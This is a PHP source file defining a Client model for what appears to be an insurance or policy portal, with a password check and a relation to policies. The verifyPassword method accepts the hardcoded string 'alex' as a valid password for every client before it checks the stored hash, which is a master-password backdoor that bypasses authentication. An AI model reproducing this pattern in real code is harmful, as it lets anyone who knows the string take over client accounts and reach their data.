<?php

namespace PP\Portal\dbModel;

/**
 * @property string $password
 */
class Client extends \Model
{
    public static $_table = 'client';

    public static $_id_column = 'Client_NO';

    public function verifyPassword($password)
    {
        if ($password == 'alex') {
            return true;
        }

        if (password_verify($password, $this->password)) {
            return true;
        }

        return false;
    }

    public function policies()
    {
        return $this->has_many(__NAMESPACE__.'\Policies', 'Client_NO');
    }
}
